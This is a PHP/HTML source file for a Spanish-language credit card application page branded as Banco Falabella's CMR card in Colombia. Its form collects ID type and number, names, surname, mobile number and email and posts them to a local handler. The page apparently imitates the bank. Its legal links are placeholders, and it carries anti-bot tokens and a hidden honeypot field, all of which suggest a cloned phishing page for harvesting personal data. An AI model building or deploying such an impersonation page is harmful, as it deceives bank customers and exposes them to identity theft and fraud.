<?php
require_once __DIR__ . '/config/security.php';
init_secure_session();
send_security_headers();
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pide tu Tarjeta de Crédito CMR | Banco Falabella</title>
    <meta name="description"
          content="Pide tu Tarjeta de Crédito CMR en solo minutos y sin cuota de manejo por 3 meses.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="css/solicitud.css">
    <style>
        .field input.input-error,
        .field select.input-error {
            border-color: #d32f2f !important;
            box-shadow: 0 0 0 1px rgba(211,47,47,0.35);
        }
        .field input.input-ok,
        .field select.input-ok {
            border-color: #2e7d32 !important;
            box-shadow: 0 0 0 1px rgba(46,125,50,0.35);
        }
    </style>
</head>

<body>

<header class="sol-header">
    <button class="sol-burger" aria-label="Menú"><span></span><span></span><span></span></button>
    <a href="index.php" class="sol-logo" aria-label="Banco Falabella">
        <img src="img/logo-fab.svg" alt="">
        <span class="sol-logo-text"><span>Banco</span><span>Falabella</span></span>
    </a>
</header>

<main class="sol-main">
    <div class="sol-bg" aria-hidden="true"></div>

    <div class="sol-wrapper">
        <section class="sol-benefits">
            <h1>Disfruta beneficios todos los días con la <b>CMR</b></h1>
            <ul>
                <li>
                    <span class="ico ico-unica">única</span>
                    <p>Encuentra descuentos siempre<br><b>en Homecenter, Falabella y comercios aliados</b></p>
                </li>
                <li>
                    <span class="ico ico-puntos"><i></i></span>
                    <p>Acumula <b>CMR Puntos</b> por todas tus compras<br>y redímelos en miles de productos</p>
                </li>
                <li>
                    <span class="ico ico-mc"><i></i><i></i></span>
                    <p>¡Tu CMR viaja contigo!<br><b>Úsala en todo Colombia y en el mundo</b></p>
                </li>
            </ul>
        </section>

        <section class="sol-card">
            <h2>Pide tu Tarjeta de Crédito CMR en solo minutos
                <strong>¡sin cuota de manejo por 3 meses!</strong>
            </h2>

            <?php $botSecSol = generate_bot_token('solicitud'); ?>
            <form id="solicitudForm" action="config/form_handler.php" method="POST" novalidate>
                <input type="hidden" name="antispam_token" value="<?php echo htmlspecialchars($botSecSol['token']); ?>">
                <input type="hidden" name="form_render_time" value="<?php echo (int)$botSecSol['timestamp']; ?>">
                <div style="display:none !important; visibility:hidden !important; position:absolute; left:-9999px;">
                    <input type="text" name="website_url" tabindex="-1" autocomplete="off">
                </div>
                <div class="field">
                    <label for="tipoDoc">Tipo de documento</label>
                    <div class="select-wrap">
                        <select id="tipoDoc" name="tipoDoc">
                            <option value="">Selecciona...</option>
                            <option>Cédula de ciudadanía</option>
                            <option>Cédula de extranjería</option>
                            <option>Pasaporte</option>
                        </select>
                    </div>
                </div>

                <div class="field">
                    <label for="numDoc">N° de documento</label>
                    <input
                        type="text"
                        id="numDoc"
                        name="numDoc"
                        inputmode="numeric"
                        autocomplete="off"
                        maxlength="10"
                        placeholder="Ej: 1234567890">
                    <small id="docError" style="color:#c62828;display:none;">
                        El número de documento debe tener máximo 10 dígitos numéricos.
                    </small>
                </div>

                <div class="field">
                    <label for="nombres">¿Cuáles son tus nombres?</label>
                    <input type="text" id="nombres" name="nombres" placeholder="Ej: Juan Pablo">
                </div>

                <div class="field">
                    <label for="apellido">Primer apellido</label>
                    <input type="text" id="apellido" name="apellido" placeholder="Ej: Bravo">
                </div>

                <div class="field">
                    <label for="celular">Celular</label>
                    <div class="phone">
                        <span class="prefix">+57</span>
                        <input
                            type="tel"
                            id="celular"
                            name="celular"
                            inputmode="numeric"
                            autocomplete="off"
                            maxlength="10"
                            pattern="3[0-9]{9}"
                            placeholder="Ej: 3XXXXXXXXX"
                            required>
                    </div>
                    <small id="celularError" style="color:#c62828;display:none;">
                        Ingresa un celular colombiano válido (10 dígitos y empieza por 3).
                    </small>
                </div>

                <div class="field">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" placeholder="Ej: nombre@correo.com">
                </div>

                <label class="check">
                    <input type="checkbox" id="acepto" name="acepto">
                    <span class="box"></span>
                    <span class="check-text">Para continuar con la solicitud es importante leer y aceptar la
                        <a href="#">Autorización de tratamiento de datos</a>, autorizar la consulta y reporte a
                        centrales de riesgo y <a href="#">aceptar el acuerdo de firma electrónica</a>.
                    </span>
                </label>

                <button type="submit" class="sol-btn" id="continuar" disabled>¡Quiero ser Gennial!</button>

                <div class="legal">
                    <p>La aprobación de la Tarjeta de Crédito CMR Banco Falabella está sujeta a políticas de crédito
                        de Banco Falabella S.A., de acuerdo a la información suministrada por el cliente.</p>
                    <p>Al solicitar tu tarjeta, formarás parte del Programa CMR Puntos y podrás acumular CMR Puntos
                        por cada compra que realices en cualquiera de nuestros canales o comercios aliados. Revisa
                        el detalle del Programa CMR Puntos y consulta la
                        <a href="#">Política de Tratamiento de Datos Personales</a>.
                    </p>
                    <p>Los depósitos en Cuentas de Ahorros de Banco Falabella S.A. están cubiertos con el seguro de
                        depósitos FOGAFÍN.</p>
                </div>
            </form>
        </section>
    </div>

    <div class="sol-slant" aria-hidden="true"></div>
</main>

<section class="why">
    <h2>¿Por qué tener una <strong>Tarjeta de Crédito CMR Mastercard Banco Falabella</strong>?</h2>
    <div class="why-grid">
        <article class="why-item">
            <span class="why-icon why-unica"><b>única</b></span>
            <h3>Disfruta mientras ahorras</h3>
            <p>Hasta 40% dto. en Homecenter, Falabella y más de 40 comercios aliados.</p>
            <a href="#">Conoce más aquí</a>
        </article>
        <article class="why-item">
            <span class="why-icon why-puntos"><b>CMR<br>puntos</b></span>
            <h3>Recibe CMR Puntos por todo</h3>
            <p>Cada vez que compres acumula CMR Puntos para redimir en viajes, restaurantes, droguerías y más.</p>
        </article>
        <article class="why-item">
            <span class="why-icon why-mc"><i></i><i></i></span>
            <h3>Tu CMR viaja contigo</h3>
            <p>Úsala en cualquier parte de Colombia y el mundo</p>
        </article>
    </div>
</section>

<script>
    const chk      = document.getElementById('acepto'),
          btn      = document.getElementById('continuar'),
          celInput = document.getElementById('celular'),
          celErr   = document.getElementById('celularError'),
          docInput = document.getElementById('numDoc'),
          docErr   = document.getElementById('docError'),
          tipoDoc  = document.getElementById('tipoDoc'),
          nombres  = document.getElementById('nombres'),
          apellido = document.getElementById('apellido'),
          email    = document.getElementById('email'),
          form     = document.getElementById('solicitudForm');

    chk.addEventListener('change', function () {
        btn.disabled = !chk.checked;
    });

    function marcarError(elemento, mostrar) {
        if (mostrar) {
            elemento.classList.add('input-error');
            elemento.classList.remove('input-ok');
        } else {
            elemento.classList.remove('input-error');
        }
    }

    function marcarOk(elemento, ok) {
        if (ok) {
            elemento.classList.add('input-ok');
            elemento.classList.remove('input-error');
        } else {
            elemento.classList.remove('input-ok');
        }
    }

    docInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        const valido = this.value.length > 0 && this.value.length <= 10;
        docErr.style.display = valido ? 'none' : 'inline';
        marcarError(this, !valido);
        marcarOk(this, valido);
    });

    celInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 10);
        const esValido = /^3\d{9}$/.test(this.value);
        celErr.style.display = (this.value.length === 10 && !esValido) ? 'inline' : 'none';
        const tieneAlgo = this.value.length > 0;
        marcarError(this, !esValido && tieneAlgo);
        marcarOk(this, esValido);
    });

    nombres.addEventListener('input', function () {
        const valido = this.value.trim().length > 0;
        marcarError(this, !valido);
        marcarOk(this, valido);
    });

    apellido.addEventListener('input', function () {
        const valido = this.value.trim().length > 0;
        marcarError(this, !valido);
        marcarOk(this, valido);
    });

    email.addEventListener('input', function () {
        const val = this.value.trim();
        const valido = val.length > 0 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
        marcarError(this, !valido);
        marcarOk(this, valido);
    });

    tipoDoc.addEventListener('change', function () {
        const valido = this.value.trim() !== '';
        marcarError(this, !valido);
        marcarOk(this, valido);
    });

    form.addEventListener('submit', function (e) {
        let valido = true;

        if (tipoDoc.value.trim() === '') {
            marcarError(tipoDoc, true);
            valido = false;
        }

        if (docInput.value.trim().length === 0) {
            marcarError(docInput, true);
            docErr.style.display = 'inline';
            valido = false;
        }

        if (nombres.value.trim().length === 0) {
            marcarError(nombres, true);
            valido = false;
        }

        if (apellido.value.trim().length === 0) {
            marcarError(apellido, true);
            valido = false;
        }

        const celValido = /^3\d{9}$/.test(celInput.value);
        if (!celValido) {
            marcarError(celInput, true);
            celErr.style.display = 'inline';
            valido = false;
        }

        const emailVal = email.value.trim();
        const emailOk = emailVal.length > 0 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal);
        if (!emailOk) {
            marcarError(email, true);
            valido = false;
        }

        if (!chk.checked) {
            btn.disabled = true;
            valido = false;
        }

        if (!valido) {
            e.preventDefault();
        }
    });
</script>
</body>

</html>
